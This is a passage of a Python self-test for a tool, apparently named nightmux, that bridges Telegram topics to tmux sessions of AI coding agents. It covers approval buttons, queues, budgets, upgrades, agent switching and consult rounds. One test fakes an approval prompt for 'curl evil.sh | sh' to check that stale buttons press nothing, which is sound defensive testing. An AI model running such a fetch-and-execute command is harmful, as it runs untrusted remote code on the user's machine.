             "❯ 1. Yes", "  2. No"], key="k1")
    assert ok is True and len(sent) == sent_n + 2      # origin, then the mirror
    assert st["asked_msgs"] == [("1", 77), ("999", 77)], st["asked_msgs"]
    pressed, edits_n = [], len(edits)
    # The pane really is asking — a mirrored button only exists because it was.
    # The answer-key guard reads the live pane, so this has to present one.
    with stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
                 visible=lambda x: ["Do you want to proceed?", "❯ 1. Yes", "  2. No"]):
        assert handle(cfg, state, threading.Lock(), "999", "!1 s") is None  # mirror tapped first
    assert pressed == [("s", "1")], pressed
    assert "asked_msgs" not in st                      # resolved: nothing left to answer
    assert any(m == "editMessageReplyMarkup" for m, _ in edits[edits_n:]), edits[edits_n:]
    with stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_))):
        assert handle(cfg, state, threading.Lock(), "1", "!1 s") is None    # origin's own copy, too late
    assert pressed == [("s", "1")], pressed             # the racing second tap: no-op
    with stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
                 visible=lambda x: ["Do you want to proceed?", "❯ 1. Yes", "  2. No"]):
        handle(cfg, state, threading.Lock(), "1", "!1")   # bare, no session: unaffected
    assert pressed == [("s", "1"), ("s", "1")], pressed

    # A button is pinned to the prompt it was drawn for. The same question about
    # another command is another prompt: the first one's buttons press nothing.
    scr_a = ["Bash command (2s)", "  rm -rf build/", "Do you want to proceed?",
             "❯ 1. Yes", "  2. No"]
    scr_b = [l.replace("rm -rf build/", "curl evil.sh | sh") for l in scr_a]
    fp_a, fp_b = prompt_fp(scr_a), prompt_fp(scr_b)
    assert fp_a != fp_b
    # Counters, borders, padding and the picked row moving are not a new prompt.
    assert fp_a == prompt_fp(["│ Bash command (3s) │", "│   rm -rf build/   │",
                              "Do you want to proceed?", "", "  1. Yes", "❯ 2. No", ""])
    assert prompt_fp(["Waiting ◐ for approval (3s)"] + scr_a) == \
        prompt_fp(["Waiting ✽ for approval (41s)"] + scr_a)               # a spinner frame
    pin = json.loads(menu_buttons(scr_a, "s", bind=True))["inline_keyboard"]
    assert [r[0]["callback_data"] for r in pin[:2]] == [f"!1 s ~{fp_a}", f"!2 s ~{fp_a}"], pin
    assert [b["callback_data"] for b in pin[-1]] == [
        "!esc s", "!up s", "!down s", f"!enter s ~{fp_a}"], pin[-1]       # only answers are pinned
    assert "~" not in menu_buttons(scr_a, "s")                            # dashboard, controls: as before
    long_ = "x" * 55                                                      # 64 bytes is Telegram's cap
    assert json.loads(menu_buttons(scr_a, long_, bind=True))["inline_keyboard"][0][0][
        "callback_data"] == f"!1 {long_}"

    pressed[:], posted = [], []
    st.pop("asked", None), st.pop("asked_msgs", None)
    ask(cfg, st, "1", "s", "rm -rf build/", scr_a, key="ka")              # A's buttons go out
    with stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
                 send=lambda c, t, x, mode="mono", buttons=None, quiet=False:
                     posted.append((x, buttons)) or 78,
                 pane=lambda x: scr_b, visible=lambda x: scr_b):          # B is up now
        refused = handle(cfg, state, threading.Lock(), "999", f"!1 s ~{fp_a}")  # a tap on A's copy
        assert "nothing pressed" in refused and pressed == [], (refused, pressed)
        assert posted and "curl evil.sh" in posted[0][0] and f"~{fp_b}" in posted[0][1], posted
        assert handle(cfg, state, threading.Lock(), "999", f"!1 s ~{fp_b}") is None
        assert pressed == [("s", "1")], pressed                           # B's own button: pressed
        assert handle(cfg, state, threading.Lock(), "1", f"!2 ~{fp_b}") is None
        assert pressed == [("s", "1"), ("s", "2")], pressed               # no session suffix: the hook's
    with stubbed(press=lambda s_, k_, confirm=False: pressed.append((s_, k_)),
                 pane=lambda x: ["● done", "❯ "], visible=lambda x: ["● done", "❯ "]):
        assert "already gone" in handle(cfg, state, threading.Lock(), "1", f"!1 ~{fp_a}")
    assert pressed == [("s", "1"), ("s", "2")], pressed
    cfg["center_topic"] = None

    st = state["s"]                               # busy: hold it where we can see it
    st["queue"], typed[:] = [], []
    screen[:] = ["● working", "✻ Brewing… (3s · esc to interrupt)"]
    held = handle(cfg, state, threading.Lock(), "1", "do this after")
    assert held.startswith("📥 queued (1) · s is working") and typed == [], held
    assert handle(cfg, state, threading.Lock(), "1", "!raw urgent") is None
    assert typed == ["urgent"], typed             # !raw still overrides
    st["mode"] = "busy"
    drain(cfg, state, "1", "s")                   # still busy: nothing moves
    assert len(st["queue"]) == 1
    st["mode"] = "idle"
    drain(cfg, state, "1", "s")
    assert typed[-1] == "do this after" and st["queue"] == []
    assert sent[-1].startswith("▶️ s sending queued prompt"), sent[-1]
    screen[:] = ["● done"] + box

    # transcript-fed delivery: the pane stops being the source of truth
    state.clear(), sent.clear(), edits.clear()
    tp = os.path.join(FILE_DIR, "live.jsonl")
    open(tp, "w").close()
    with open(os.path.join(STATE_DIR, "live.json"), "w") as f:
        json.dump({"ts": time.time(), "pane": "%5", "transcript": tp,
                   "five_hour": {"used_percentage": 12, "resets_at": None}}, f)
    screen[:] = ["● Read(x.py)", "✻ Brewing… (3s · esc to interrupt)"]
    flush_new(cfg, state, "1", "s", "%5")      # baseline the transcript
    with open(tp, "a") as f:
        f.write(json.dumps({"type": "assistant", "message": {"content": [
            {"type": "tool_use", "name": "Read", "input": {"file_path": "x.py"}}]}}) + "\n")
    st = state["s"]
    st["prog_at"] = _prog_at[0] = 0
    flush_new(cfg, state, "1", "s", "%5")      # busy: trace comes from the file
    assert sent[-1] == "⚙️ s\n● Read(x.py)", sent[-1]
    with open(tp, "a") as f:
        f.write(json.dumps({"type": "assistant", "message": {"content": [
            {"type": "text", "text": "**done** at last"}]}}) + "\n")
    screen[:] = ["● Read(x.py)", "● and some chrome the pane shows"] + box
    twice_p = lambda: [flush_new(cfg, state, "1", "s", "%5") for _ in range(2)]
    twice_p()
    assert sent[-1] == "✅ s\n● Read(x.py)\n**done** at last", sent[-1]
    assert "s" in state and not state["s"].get("tbuf")
    twice_p()                                     # nothing new in the file: silence
    assert sent[-1].startswith("✅ s\n● Read")
    globals()["live_sessions"] = lambda: {"s": "%5"}
    report = status_report({"topics": {"1": "s"}}, state)
    assert "5h 12%" in report and "no status line" not in report, report
    held, state["s"]["snap"] = state["s"]["snap"], None    # watched through the
    assert "[no status line]" in status_report({"topics": {"1": "s"}}, state)
    state["s"]["snap"] = held                             # keyhole, and saying so
    os.remove(tp)

    cfg["topics"] = {"1": "s"}                    # status + watchdog
    assert "✅ s" in status_report(cfg, state) and "topic 1" in status_report(cfg, state)
    n = len(sent)                                 # gone before this run ever saw it:
    assert watchdog(cfg, state, "1", "ghost", False) is False and len(sent) == n
    assert state.pop("ghost")["dead"]             # marked, not announced
    state["s"]["seen"] = True                     # "s" was alive earlier this run
    assert watchdog(cfg, state, "1", "s", False) is False and "💀" in sent[-1]
    n = len(sent)
    watchdog(cfg, state, "1", "s", False)         # dead stays quiet after the first
    assert len(sent) == n

    # Held work for a session no topic watches is dropped, not "restored" on
    # every restart forever; a benched agent's is its topic's, and kept.
    rcfg = {"topics": {"1": "s"}, "started": {"1": "claude"},
            "bench": {"1": {"claude": "s", "agy": "s-agy"}}}
    rstate = {}

    def fake_load(st):
        held = {"orphan": {"queue": ["lost"]}, "s-agy": {"queue": ["kept"]}}
        st.update({k: dict(v) for k, v in held.items()})
        return held
    with stubbed(load_queue=fake_load):
        restore_held(rcfg, rstate)
    assert "orphan" not in rstate and rstate["s-agy"]["queue"] == ["kept"], rstate
    assert len(sent) == n + 1 and "1 queued prompt(s) kept" in sent[-1], sent[n:]
    state["s"].update(queue=["held"], limit_until=time.time() + 60, scr=["junk"])
    watchdog(cfg, state, "1", "s", True)
    assert "↩️" in sent[-1] and "scr" not in state["s"]   # rebaselined, no dump
    assert state["s"]["queue"] == ["held"]        # ...but the hold is not a cache
    state.pop("s")
    globals()["live_sessions"] = lambda: {}
    assert "💀 gone" in status_report({"topics": {"2": "gone"}}, {})

    # Voice/audio/video-note updates ride the same download-and-type path as a
    # photo or a document — just another field to notice on the way in.
    cfg5, fetched = {"chat_id": -1}, []
    with stubbed(fetch_file=lambda c, fid, name=None: fetched.append((fid, name)) or "/f/x",
                handle=lambda *a, **k: None, api=lambda c, m, **kw: {}):
        process(cfg5, {}, threading.Lock(), {7}, {
            "update_id": 1, "message": {"chat": {"id": -1}, "from": {"id": 7},
             "message_thread_id": "1", "voice": {"file_id": "v1", "duration": 3}}})
        assert fetched[-1] == ("v1", None), fetched
        process(cfg5, {}, threading.Lock(), {7}, {
            "update_id": 2, "message": {"chat": {"id": -1}, "from": {"id": 7},
             "message_thread_id": "1",
             "video_note": {"file_id": "vn1", "duration": 5}}})
        assert fetched[-1] == ("vn1", None), fetched
        process(cfg5, {}, threading.Lock(), {7}, {   # audio can carry a name; voice never does
            "update_id": 3, "message": {"chat": {"id": -1}, "from": {"id": 7},
             "message_thread_id": "1",
             "audio": {"file_id": "a1", "file_name": "song.mp3"}}})
        assert fetched[-1] == ("a1", "song.mp3"), fetched

    order, gate, ran = [], threading.Event(), threading.Event()

    def slow(c, s, l, a, upd):     # topic 1's first update hangs until released
        gate.wait(5) if upd["update_id"] == 1 else None
        order.append(upd["update_id"])
        ran.set() if upd["update_id"] == 3 else None

    globals()["process"] = slow
    acks = Acks()
    for uid, tp in ((1, 1), (2, 1), (3, 2)):
        dispatch(cfg, state, threading.Lock(), set(),
                 {"update_id": uid, "message": {"message_thread_id": tp}}, acks)
    assert ran.wait(5), "a slow topic blocked a different one"
    assert order == [3], order          # 1 is hung, and 2 waits behind it in order
    assert load_offset() is None        # ...so nothing is acked past the hung one
    gate.set()
    for _ in range(50):
        if len(order) == 3:
            break
        time.sleep(0.1)
    assert order == [3, 1, 2], order    # per topic in order, across topics in parallel
    assert load_offset() == 4
    os.remove(OFFSET_PATH)

    forum = {"message": {"chat": {"id": -100, "type": "supergroup",
                                  "is_forum": True, "title": "work"},
                         "from": {"id": 7}}}
    assert setup_chat(forum) == (-100, 7, "work")
    added = {"my_chat_member": {"chat": forum["message"]["chat"], "from": {"id": 7},
                                 "new_chat_member": {"status": "administrator"}}}
    assert setup_chat(added) == (-100, 7, "work")      # bot added: bound before anyone types
    for bad in ({"message": {"chat": {"id": 5, "type": "private"}}},   # DM: no topics
                {"message": {"chat": {"id": -1, "type": "supergroup"}}},  # topics off
                {"edited_message": {"chat": {"id": -1, "type": "supergroup"}}}):
        assert setup_chat(bad) is None, bad

    sfile = os.path.join(STATE_DIR, "settings.json")
    os.makedirs(STATE_DIR, exist_ok=True)
    with open(sfile, "w") as f:                    # an existing settings file
        json.dump({"model": "opus", "hooks": {"Stop": [{"hooks": [
            {"type": "command", "command": "mine.sh"}]}]}}, f)
    assert len(wire_claude(sfile)) == 3            # Stop, Notification, status line
    # Claude's session filed as agy (a topic re-bound while marked agy) sent !agy
    # into claude. The pane's binary decides; a config-defined key is not second-guessed.
    mix_ = {"topics": {"7": "tg"}, "started": {"7": "agy"},
            "bench": {"7": {"agy": "tg", "opencode": "tg-oc", "mine": "tg-m"}}}
    with stubbed(_agent={"tg": "claude", "tg-oc": "opencode", "tg-m": "claude"}):
        assert bench_of(mix_, "7") == {"claude": "tg", "opencode": "tg-oc", "mine": "tg-m"}
    with stubbed(_agent={}):                       # nothing known: trust the config
        assert bench_of(mix_, "7")["agy"] == "tg"
    import tempfile
    with tempfile.TemporaryDirectory() as h_:     # new box: no ~/.claude yet
        fresh_ = os.path.join(h_, ".claude", "settings.json")
        assert len(wire_claude(fresh_)) == 3
        assert os.path.exists(os.path.join(h_, ".claude", "nightmux-statusline.sh"))
    assert wire_claude(sfile) == [], "re-running setup duplicated a hook"
    with open(sfile) as f:
        got = json.load(f)
    assert got["model"] == "opus"                  # unrelated settings survive
    stop = [h["command"] for g in got["hooks"]["Stop"] for h in g["hooks"]]
    assert stop[0] == "mine.sh" and stop[1].endswith("nightmux_stop.py"), stop
    got["statusLine"] = {"type": "command", "command": "bash /nope/theirs.sh"}
    with open(sfile, "w") as f:
        json.dump(got, f)
    assert "add this line" in wire_claude(sfile)[0]  # theirs: instructions, not a rewrite
    with open(sfile) as f:
        assert "theirs.sh" in json.load(f)["statusLine"]["command"]
    assert sorted(wired(sfile)) == ["notify", "stop"]   # their status line: no sidecar
    assert wired(os.path.join(STATE_DIR, "nope.json")) == []

    scratch = os.path.join(os.path.dirname(FILE_DIR), ".mig-selfcheck")
    os.makedirs(scratch, exist_ok=True)
    newer = os.path.join(scratch, "nightmux.json")
    for was in WAS:                   # every old name is adopted, not just the last
        older = newer.replace("nightmux", was)
        open(older, "w").close()
        migrate([newer])
        assert os.path.exists(newer) and not os.path.exists(older), was
        os.remove(newer)
    older = newer.replace("nightmux", WAS[0])
    open(older, "w").close()
    open(newer, "w").close()          # a current file already there wins
    migrate([newer])
    assert os.path.exists(older), "migrate clobbered the current file"
    os.remove(older), os.remove(newer)
    migrate([newer])                  # nothing to adopt: a fresh install
    os.rmdir(scratch)

    cfg2 = {"topics": {}, "agents": {"opencode": ["opencode", "--resume"]}}
    assert agent(cfg2, "claude") == ("claude", "--continue")
    with tempfile.TemporaryDirectory() as pj_:
        old_pj_ = PROJECTS
        globals()["PROJECTS"] = pj_
        try:
            assert not claude_has_chat("/www/agent")
            os.makedirs(os.path.join(pj_, "-www-agent"))
            open(os.path.join(pj_, "-www-agent", "s.jsonl"), "w").close()
            assert claude_has_chat("/www/agent") and not claude_has_chat("/www/other")
        finally:
            globals()["PROJECTS"] = old_pj_
    assert agent(cfg2, "opencode") == ("opencode", "--resume")    # added by config
    assert agent(cfg2, "nope") == ("nope", "")   # one-off: the key is the command
    assert default_agent(cfg2) == "claude"
    assert default_agent({"agent": "codex"}) == "codex"

    spawned, lk = [], threading.Lock()
    globals()["spawn"] = lambda n, cwd, line, cfg=None: spawned.append((n, cwd, line))
    globals()["has_session"] = lambda n: False
    assert "started codex" in start_session(cfg2, {}, lk, "9", "box ~ --sandbox",
                                            "codex")
    assert spawned[-1][2] == "codex --sandbox", spawned[-1]
    assert cfg2["topics"]["9"] == "box" and cfg2["started"]["9"] == "codex"
    # "!agy box ~" in box's own topic: point at bare !agy, not at !bind.
    globals()["has_session"] = lambda n: n == "box"
    assert "send just !agy" in start_session(cfg2, {}, lk, "9", "box ~", "agy")
    assert "use !bind box" in start_session(cfg2, {}, lk, "8", "box ~", "agy")
    globals()["has_session"] = lambda n: False
    # !help: an index with a button per section, sections, search, everything.
    hi_, rows_ = help_text(cfg2)
    assert len([b for r in rows_ for b in r]) == len(HELP) + 1 and "!help night" in hi_
    assert help_text(cfg2, "night")[0].startswith("🌙") and help_text(cfg2, "night")[1] is None
    assert "!goal [n]" in help_text(cfg2, "!goal")[0] and "nothing about" in help_text(cfg2, "zzz")[0]
    all_ = help_text(cfg2, "all")[0]
    assert "opencode" in all_ and "{agents}" not in all_ and PLUGIN_DIR in all_
    # Every command the old flat list named is still somewhere in a section.
    for c_ in ("!bind", "!consult", "!use", "!shift", "!at", "!queue", "!usage", "!grep", "!plugins",
               "!autocompact", "!keys", "!raw", "!model", "!worktrees", "!center", "!failover",
               "!update", "!reload", "!tz", "!digest", "!idea", "!errors", "!desktop", "!memory"):
        assert c_ in all_, c_
    # !upgrade: a git checkout fast-forwards, refuses over local edits, rolls
    # back code that does not compile; a branch and a detached deploy both move.
    import tempfile
    with tempfile.TemporaryDirectory() as ud_:
        g_ = lambda d, *a: subprocess.run(("git", "-C", d) + a, capture_output=True, text=True)
        org_, wk_, dep_ = (os.path.join(ud_, x) for x in ("o", "w", "d"))
        subprocess.run(("git", "init", "-q", "-b", "main", org_), capture_output=True)
        for d_ in (org_,):
            g_(d_, "config", "user.email", "t@t")
            g_(d_, "config", "user.name", "t")
        with open(os.path.join(org_, "nightmux.py"), "w") as f:
            f.write("x = 1\n")
        g_(org_, "add", "-A")
        g_(org_, "commit", "-qm", "one")
        subprocess.run(("git", "clone", "-q", org_, wk_), capture_output=True)
        subprocess.run(("git", "clone", "-q", org_, dep_), capture_output=True)
        g_(dep_, "checkout", "-q", "--detach")
        assert self_upgrade(wk_)[1].startswith("already up to date"), self_upgrade(wk_)
        with open(os.path.join(org_, "nightmux.py"), "w") as f:
            f.write("x = 2\n")
        g_(org_, "commit", "-qam", "two")
        with open(os.path.join(wk_, "nightmux.py"), "w") as f:
            f.write("mine\n")
        assert "local edits" in self_upgrade(wk_)[1]
        g_(wk_, "checkout", "-q", "--", ".")
        assert self_upgrade(wk_)[0] and self_upgrade(dep_)[0]
        assert open(os.path.join(dep_, "nightmux.py")).read() == "x = 2\n"
        with open(os.path.join(org_, "nightmux.py"), "w") as f:
            f.write("def (:\n")
        g_(org_, "commit", "-qam", "broken")
        ch_, msg_ = self_upgrade(wk_)
        assert not ch_ and "does not compile" in msg_, msg_
        assert open(os.path.join(wk_, "nightmux.py")).read() == "x = 2\n"
    assert latest_release_tag(["v1.9.0", "v1.10.0", "v1.11.0-rc1", "vps-test", "v1.10"]) == "v1.10.0"
    assert latest_release_tag(["vps-test", "v2-rc"]) is None
    usaid_, ure_ = [], []
    with stubbed(self_upgrade=lambda: (True, "a → b"), restart_self=lambda: ure_.append(1),
                 peer_call=lambda c, n, p, b=None, timeout=10: {"msg": "1.3 → 1.4 · restarting"} if n == "box" else None,
                 send=lambda c, t, x, mode="mono", buttons=None, quiet=False: usaid_.append(x)):
        assert "every peer" in upgrade_cmd({"peers": {"box": {}, "old": {}}, "name": "me"}, "1", "all")
        for _ in range(100):
            if usaid_:
                break
            time.sleep(0.02)
    assert ure_ and "me: a → b · restarting" in usaid_[0] and "box: 1.3 → 1.4" in usaid_[0], usaid_
    assert "old: no answer" in usaid_[0] and writes({}, "!upgrade", ""), usaid_
    # !budget: the ledger fills from transcript spend; 80% warns once, 100%
    # holds every agent of the topic until the period ends, off lifts it.
    bsaid_ = []
    bcfg_ = {"topics": {"3": "b"}, "bench": {"3": {"claude": "b", "codex": "b-codex"}}, "tz_offset": 0}
    bst_ = {"b": {}}
    s0_, e0_ = budget_window(bcfg_, "day", 1760000000)
    assert e0_ - s0_ == 86400 and s0_ % 86400 == 0 and s0_ <= 1760000000 < e0_
    ws_, we_ = budget_window(bcfg_, "week", 1760000000)
    assert time.gmtime(ws_).tm_wday == 0 and we_ - ws_ == 7 * 86400
    ms_, _ = budget_window(bcfg_, "month", 1760000000)
    assert time.gmtime(ms_).tm_mday == 1
    old_sav_ = dict(_sav)
    _sav["d"] = {"since": 0}
    try:
        with stubbed(save_cfg=lambda c: None, save_queue=lambda s: None, has_session=lambda s: True,
                     send=lambda c, t, x, mode="mono", buttons=None, quiet=False: bsaid_.append(x)):
            assert "no budget" in handle(bcfg_, bst_, threading.Lock(), "3", "!budget")
            assert "usage" in handle(bcfg_, bst_, threading.Lock(), "3", "!budget lots")
            assert "of 1.0M this day" in handle(bcfg_, bst_, threading.Lock(), "3", "!budget 1M")
            bst_["b"]["unbilled"] = 850000
            budget_tick(bcfg_, bst_, "3", "b")
            assert "85%" in bsaid_[-1] and "limit_until" not in bst_["b"], bsaid_
            budget_tick(bcfg_, bst_, "3", "b")
            assert len(bsaid_) == 1                     # warned once per period
            bst_["b"]["unbilled"] = 200000
            budget_tick(bcfg_, bst_, "3", "b")
            assert "spent its daily budget" in bsaid_[-1], bsaid_
            assert bst_["b"]["limit_until"] > time.time() and bst_["b-codex"]["limit_until"] > time.time()
            assert "hold lifted" in handle(bcfg_, bst_, threading.Lock(), "3", "!budget off")
            assert "limit_until" not in bst_["b"] and "3" not in bcfg_["budgets"]
            assert "limit_until" not in bst_["b-codex"]          # every agent of the topic
            # A new amount already spent holds at once; a bigger one lifts it,
            # as the hold message says.
            handle(bcfg_, bst_, threading.Lock(), "3", "!budget 1M")
            assert "spent its daily budget" in bsaid_[-1] and bst_["b"]["limit_until"] > time.time(), bsaid_
            assert "of 2.0M" in handle(bcfg_, bst_, threading.Lock(), "3", "!budget 2M")
            assert "limit_until" not in bst_["b"] and "limit_until" not in bst_["b-codex"]
            # In dollars: each usage record at its model's list price, and a
            # model with no price at the dearest one, never free.
            d_ = tempfile.mkdtemp()
            tp_ = os.path.join(d_, "t.jsonl")
            open(tp_, "w").close()
            bst_["b"].update(tpos=0, tpath=tp_)
            assert "$0.00 of $2.00 this day" in handle(bcfg_, bst_, threading.Lock(), "3", "!budget $2")
            rec_ = lambda m, **u: json.dumps({"message": {"model": m, "usage": u}}) + "\n"
            with open(tp_, "a") as f:
                f.write(rec_("claude-sonnet-4-5", input_tokens=100000, output_tokens=100000))
            tail_transcript(bst_["b"], tp_)
            budget_tick(bcfg_, bst_, "3", "b")
            assert "90%" in bsaid_[-1] and "($1.80 of $2.00)" in bsaid_[-1], bsaid_
            with open(tp_, "a") as f:
                f.write(rec_("claude-next", output_tokens=10000))
            tail_transcript(bst_["b"], tp_)
            budget_tick(bcfg_, bst_, "3", "b")
            assert "budget: $2.30 of $2.00" in bsaid_[-1] and budget_line(bcfg_, "3") == "$2.30 of $2.00 this day"
            shutil.rmtree(d_)
            assert "hold lifted" in handle(bcfg_, bst_, threading.Lock(), "3", "!budget off")
            spend_note("b", 5, now=time.time() - 40 * 86400)
            assert len(sav_data()["spent"]["b"]) == 2   # added, then pruned on the next note
            spend_note("b", 5)
            assert len(sav_data()["spent"]["b"]) == 1, sav_data()["spent"]
    finally:
        _sav.update(old_sav_)
    # !stopall interrupts what is working, holds the rest, and only !stopall
    # off lifts it: not a usage window that resets.
    xkeys_ = []
    xcfg_ = {"topics": {"1": "x1", "2": "x2"}, "bench": {"1": {"claude": "x1", "codex": "x1-codex"}}}
    xst_ = {"x1": {"mode": "busy"}, "x2": {"mode": "idle", "queue": ["q"], "limit_until": time.time() - 1}}
    with stubbed(save_queue=lambda s: None, has_session=lambda s: True, agentless=lambda s: False,
                 visible=lambda s: [s], pane_state=lambda l: "busy" if l == ["x1"] else "idle",
                 tmux=lambda *a: xkeys_.append(a) or "", snapshot_repo=lambda s: None,
                 inject=lambda s, t: xkeys_.append(("inject", s, t)) or True,
                 send=lambda c, t, x, mode="mono", buttons=None, quiet=False: None):
        out_ = handle(xcfg_, xst_, threading.Lock(), "2", "!stopall")
        assert "stopped 3: x1 (interrupted), x1-codex, x2" in out_, out_
        assert xkeys_ == [("send-keys", "-t", tgt("x1"), "C-c")], xkeys_
        assert "!stopall off" in send_prompt(xcfg_, xst_, "1", "x1", "more") and xst_["x1"]["queue"] == ["more"]
        drain(xcfg_, xst_, "2", "x2")
        assert len(xkeys_) == 1 and "limit_until" not in xst_["x2"], xkeys_   # the window reset; still held
        assert queue_blob(xst_)["x1-codex"] == {"stop_hold": True}            # and kept across a restart
        assert "3 session(s) go again" in handle(xcfg_, xst_, threading.Lock(), "2", "!stopall off")
        drain(xcfg_, xst_, "2", "x2")
        assert xkeys_[-1] == ("inject", "x2", "q"), xkeys_
    cfg2["topics"].pop("9")                      # the session died; resume the topic
    handle(cfg2, {}, lk, "9", "!resume")
    assert spawned[-1][2] == "codex resume --last", spawned[-1]   # not claude's flag
    handle(cfg2, {}, lk, "9", "!resume aider")   # an explicit agent still wins
    assert spawned[-1][2] == "aider --restore-chat-history", spawned[-1]
    handle(cfg2, {}, lk, "77", "!opencode side")
    assert spawned[-1][2] == "opencode", spawned[-1]

    # !restore is !resume under another name — both funnel through resume_session.
    cfg2["topics"]["91"] = "ghost"
    n = len(spawned)
    assert "no directory recorded" in handle(cfg2, {}, lk, "91", "!restore")
    assert len(spawned) == n, spawned[n:]        # a topic with no dir stays down
    cfg2.setdefault("dirs", {})["91"] = "/tmp"
    out = handle(cfg2, {}, lk, "91", "!restore")
    assert spawned[-1][:2] == ("ghost", "/tmp") and "topic bound" in out, out
    assert cfg2["started"]["91"] == "claude"

    # One topic, several agents. Bare !<agent> moves the topic to that agent in
    # the same directory and leaves the one it was on running; switching back
    # must reuse that session, or "switch" would mean "start a new conversation".
    live = {"box"}
    globals()["has_session"] = lambda s: s in live
    cfg2["topics"]["9"], cfg2["started"]["9"] = "box", "codex"
    cfg2["dirs"]["9"] = "/tmp"
    out = handle(cfg2, {}, lk, "9", "!agy")
    assert spawned[-1][:2] == ("box-agy", "/tmp"), spawned[-1]
    assert cfg2["topics"]["9"] == "box-agy" and cfg2["started"]["9"] == "agy"
    assert cfg2["bench"]["9"] == {"codex": "box", "agy": "box-agy"}, cfg2["bench"]
    assert "also live in the same tree: box" in out, out   # two agents, one tree
    live.add("box-agy")
    n = len(spawned)
    assert "\u2192 codex ('box')" in handle(cfg2, {}, lk, "9", "!codex")
    assert len(spawned) == n, "switching back respawned instead of reusing"
    assert cfg2["topics"]["9"] == "box" and cfg2["started"]["9"] == "codex"
    assert "already on codex" in handle(cfg2, {}, lk, "9", "!codex")
    assert "\u25cf !codex" in handle(cfg2, {}, lk, "9", "!agents")
    handle(cfg2, {}, lk, "9", "!agy named /tmp")   # with args: still start-by-name
    assert spawned[-1][0] == "named" and cfg2["bench"]["9"]["agy"] == "box-agy"

    # ...and one session must never be two topics'. They share a scrape cursor,
    # so the watcher hands the output to whichever topic it reaches first.
    # @agent: one prompt to one bench agent, without moving the topic.
    # Put topic 9 back exactly as found: the tests below turn on which session
    # it is on, and switch_agent short-circuits when the bench already names it.
    was9 = (cfg2["topics"].get("9"), cfg2["started"].get("9"),
            dict((cfg2.get("bench") or {}).get("9") or {}))
    cfg2.setdefault("bench", {})["9"] = {"codex": "box", "agy": "box-agy"}
    cfg2["topics"]["9"], cfg2["started"]["9"] = "box", "codex"
    assert bench_of(cfg2, "9") == {"codex": "box", "agy": "box-agy"}
    sent_to = []
    with stubbed(has_session=lambda s: True,
                 send_prompt=lambda c, st, t, se, tx, mid=None: sent_to.append((se, tx))):
        assert address(cfg2, {}, "9", "no prefix here") is None      # falls through
        assert address(cfg2, {}, "9", "@agy fix the parser") == "→ agy (box-agy)"
        assert sent_to[-1] == ("box-agy", "fix the parser"), sent_to[-1]
        assert cfg2["topics"]["9"] == "box", "addressing must not switch the topic"
        assert "no gemini in this topic" in address(cfg2, {}, "9", "@gemini hi")
        assert address(cfg2, {}, "9", "@agy") is None                # no prompt: text
    with stubbed(has_session=lambda s: False):
        assert "is gone" in address(cfg2, {}, "9", "@agy hello")

    # consult: two agents, two rounds, one prompt back.
    assert fenced("noise\n```py\nfirst\n```\nmid\n```\nLAST ONE\n```") == "LAST ONE"
    assert fenced("no fence here") == ""
    csent, cprompts = [], []
    with stubbed(has_session=lambda s: True,
                 send=lambda c, t, x, mode="mono", buttons=None, quiet=False: csent.append(x),
                 send_prompt=lambda c, st, t, se, tx, mid=None: cprompts.append((se, tx))):
        _consult.clear()
        # Too few agents: said with the command that fixes it and a button,
        # so it is sent rather than returned.
        n_ = len(csent)
        assert consult_start({"topics": {"9": "solo"}, "bench": {},
                              "dirs": {"9": "/www/x"}}, {}, "9", "q?") is None
        assert "this topic has 1" in csent[-1] and "/www/x" in csent[-1], csent[-1]
        assert len(csent) == n_ + 1
        out = consult_start(cfg2, {}, "9", "how should we shard this?")
        assert "round 1" in out and len(cprompts) == 2, out
        assert "how should we shard this?" in cprompts[0][1]
        assert "already running" in consult_start(cfg2, {}, "9", "again?")
        c = _consult["9"]
        # round 1 lands: the drafts are captured, not posted to the topic
        assert consult_capture("9", "box", "codex draft") is True
        assert consult_capture("9", "box", "twice") is False   # one per round
        assert consult_capture("9", "somebody-else", "x") is False
        assert consult_capture("9", "box-agy", "agy draft") is True
        n = len(cprompts)
        consult_tick(cfg2, {})
        assert len(cprompts) == n + 2, "round 2 did not go out"
        assert "agy draft" in cprompts[-1][1] or "agy draft" in cprompts[-2][1]
        assert c["round"] == 2 and c["got"] == {}
        # round 2 lands with a fenced prompt from each
        consult_capture("9", "box", "I agree.\n```\nDO THE THING\n```")
        consult_capture("9", "box-agy", "Mostly.\n```\nDO IT DIFFERENTLY\n```")
        consult_tick(cfg2, {})
        assert "9" not in _consult, "consult did not finish"
        assert any("they differ" in x for x in csent), csent[-3:]
        assert any("DO THE THING" in x for x in csent), csent[-3:]
        assert any("DO IT DIFFERENTLY" in x for x in csent), csent[-3:]
        # ...and the verdict is runnable without anyone retyping it
        assert _verdict["9"] == {"codex": "DO THE THING",
                                 "agy": "DO IT DIFFERENTLY"}, _verdict["9"]
        assert "which one?" in use_prompt(cfg2, {}, "9", "")   # two: say which
        ran = []
        with stubbed(send_prompt=lambda c, st, t, se, tx, mid=None: ran.append((se, tx))):
            out = use_prompt(cfg2, {}, "9", "agy")
            assert ran == [(cfg2["topics"]["9"], "DO IT DIFFERENTLY")], ran
            assert out.startswith("▶️ running agy's prompt"), out
        assert "no consult result" in use_prompt(cfg2, {}, "404", "")
        # agreement is reported as agreement, and said once
        _consult.clear(), csent.clear(), cprompts.clear()
        consult_start(cfg2, {}, "9", "same?")
        consult_capture("9", "box", "a"), consult_capture("9", "box-agy", "b")
        consult_tick(cfg2, {})
        consult_capture("9", "box", "```\nSAME\n```")
        consult_capture("9", "box-agy", "```\nSAME\n```")
        consult_tick(cfg2, {})
        assert any("same prompt" in x for x in csent), csent[-2:]
        assert sum("SAME" in x for x in csent) == 1, "agreed prompt sent twice"
        # a participant whose session dies is dropped, not waited on
        _consult.clear(), csent.clear()
        consult_start(cfg2, {}, "9", "one dies?")
        with stubbed(has_session=lambda s: s != "box-agy", agentless=lambda s: False):
            consult_capture("9", "box", "the survivor's draft")
            consult_tick(cfg2, {})
        assert any("box-agy is gone" in x for x in csent), csent
        assert "9" not in _consult, "a lone survivor should report, not wait"
        # a round nobody answers is given up on, not left hanging
        _consult.clear(), csent.clear()
        consult_start(cfg2, {}, "9", "silence?")
        _consult["9"]["at"] = time.time() - CONSULT_TIMEOUT - 1
        consult_tick(cfg2, {})
        assert "9" not in _consult and any("nobody answered" in x for x in csent)

